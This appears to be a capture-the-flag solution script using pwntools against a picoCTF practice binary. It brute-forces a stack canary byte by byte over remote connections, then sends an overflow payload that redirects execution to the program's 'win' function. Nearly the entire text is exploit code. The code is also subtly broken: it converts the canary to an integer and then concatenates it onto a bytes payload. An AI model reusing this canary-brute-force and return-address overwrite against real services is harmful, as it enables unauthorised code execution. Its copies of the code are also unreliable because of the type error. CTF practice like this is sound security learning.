#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()


def leak_canary():
    canary = b''
    guess = 0x41
    header = b'A' * 64
    while (len(canary) < 4):
        r = remote("saturn.picoctf.net", 56206)
        payload = header
        payload += canary
        payload += p8(guess)
        r.recvuntil(">")
        r.sendline(str(len(payload)))
        r.recvuntil(">")
        r.send(payload)
        responce = r.recvall()
        r.close()
        if b"Ok" in responce:
            canary += p8(guess)
            guess = 0x41
            continue
        else:
            guess += 1;
            continue

    canary = u32(canary, endian="big")
    return canary

canary = leak_canary()
#canary = b'BiRd'
win_func_addr = elf.symbols['win']
payload = b'A' * 64
payload += canary
payload += b'B' * 16
payload += p32(win_func_addr+0x5)
r = remote("saturn.picoctf.net", 56208)
#r = gdb.debug(chall, "b *vuln+294")
r.recvuntil(">")
r.sendline(str(len(payload)))
r.recvuntil(">")
r.sendline(payload)

r.interactive()
